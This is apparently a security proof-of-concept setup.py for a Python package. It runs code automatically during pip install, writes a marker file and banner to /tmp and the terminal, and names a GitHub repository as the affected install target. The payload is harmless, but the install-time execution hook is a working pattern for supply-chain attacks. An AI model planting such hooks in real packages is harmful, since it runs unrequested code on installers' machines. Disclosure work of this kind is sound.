from setuptools import setup
import os

LOCK_FILE = "/tmp/.supply_chain_poc_lock"

def run_poc_once():
    # Prevent multiple executions across pip build phases
    if os.path.exists(LOCK_FILE):
        return

    try:
        with open(LOCK_FILE, "w") as f:
            f.write("executed\n")
    except:
        pass

    pid = os.getpid()
    poc_file = f"/tmp/SUPPLY_CHAIN_POC_{pid}.txt"
    user = os.getenv("USER", "unknown")

    banner = (
        "┌──────────────────────────────────────────────────────┐\n"
        "│          SUPPLY CHAIN ATTACK – PROOF OF CONCEPT       │\n"
        "│                    by TalhaKhan                       │\n"
        "└──────────────────────────────────────────────────────┘\n"
    )

    # ---- PROOF FILE (FORENSIC ARTIFACT) ----
    with open(poc_file, "w") as f:
        f.write(banner)
        f.write("\n")
        f.write(f"Proof File   : {poc_file}\n")
        f.write(f"Process ID   : {pid}\n")
        f.write(f"Executed As  : {user}\n")
        f.write("\n")
        f.write("Summary:\n")
        f.write("────────\n")
        f.write("- Code executed during `pip install` from GitHub URL\n")
        f.write("- Execution occurs during build / metadata phase\n")
        f.write("- Impact: Repository Takeover → Remote Code Execution\n")
        f.write("\n")
        f.write("Affected Pattern Example:\n")
        f.write("────────────────────────\n")
        f.write("git+https://github.com/alundesap/python-jws.git/#egg=jws\n")

    # ---- TERMINAL OUTPUT (CLEAN & PROFESSIONAL) ----
    try:
        term = open("/dev/tty", "w")
        term.write("\n" + banner)
        term.write("\n")
        term.write("✔ Installation triggered arbitrary code execution\n\n")
        term.write(f"• Proof File : {poc_file}\n")
        term.write(f"• Process ID: {pid}\n\n")
        term.write("Impact:\n")
        term.write("───────\n")
        term.write("• pip install from GitHub URL\n")
        term.write("• Repository Takeover → RCE\n\n")
        term.write("Enterprise Example:\n")
        term.write("───────────────────\n")
        term.write("git+https://github.com/alundesap/python-jws.git/#egg=jws\n")
        term.write("\n")
        term.close()
    except:
        pass


run_poc_once()

setup(
    name="supply-chain-poc",
    version="0.1.0",
    author="TalhaKhan",
)
